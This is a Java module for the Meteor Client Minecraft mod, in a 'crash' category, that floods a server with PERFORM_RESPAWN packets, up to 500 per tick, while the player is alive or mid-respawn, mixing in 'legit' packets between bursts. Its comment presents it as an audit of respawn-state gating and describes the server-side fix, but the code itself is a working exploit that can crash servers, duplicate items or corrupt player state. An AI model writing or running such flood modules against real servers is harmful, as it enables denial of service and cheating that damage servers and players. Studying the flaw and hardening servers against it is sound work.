package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClientStatusC2SPacket;

/**
 * AUDIT: Respawn Race (PERFORM_RESPAWN in an illegal state)
 *
 * Floods ClientStatus(PERFORM_RESPAWN). This packet is only valid when the
 * player is actually dead and on the respawn screen, but the client controls
 * when it is sent. Spamming it while ALIVE — or many times in one tick during
 * the brief death→respawn handoff — probes whether the server gates respawn on
 * authoritative player state or trusts the request.
 *
 * A server that re-runs respawn logic on each packet without checking "is this
 * player actually awaiting respawn?" can be driven to re-initialise the player
 * entity repeatedly: position reset, inventory reload, dimension placement —
 * and during the handoff window (criterion 2) that reinit can race other
 * in-flight packets, a classic source of duplication / corrupted player state.
 *
 * What a vulnerable server does: processes PERFORM_RESPAWN whenever it arrives.
 * What a hardened server does: ignores it unless the player is in the
 * awaiting-respawn state, and rate-limits the transition.
 * Fix: gate PERFORM_RESPAWN on server-authoritative death state; make the
 * death→respawn transition atomic and reject concurrent respawn requests.
 *
 * Run against your OWN local server only.
 */
public class RespawnRace extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("respawns-per-tick").description("PERFORM_RESPAWN packets per tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 200).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public RespawnRace() {
        super(AddonTemplate.CRASH_CATEGORY, "respawn-race",
            "Floods PERFORM_RESPAWN while alive / mid-transition. Tests respawn-state gating and transition atomicity.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        for (int i = 0; i < perTick.get(); i++) {
            mc.player.networkHandler.sendPacket(new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.PERFORM_RESPAWN));
            packetsSent++;
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
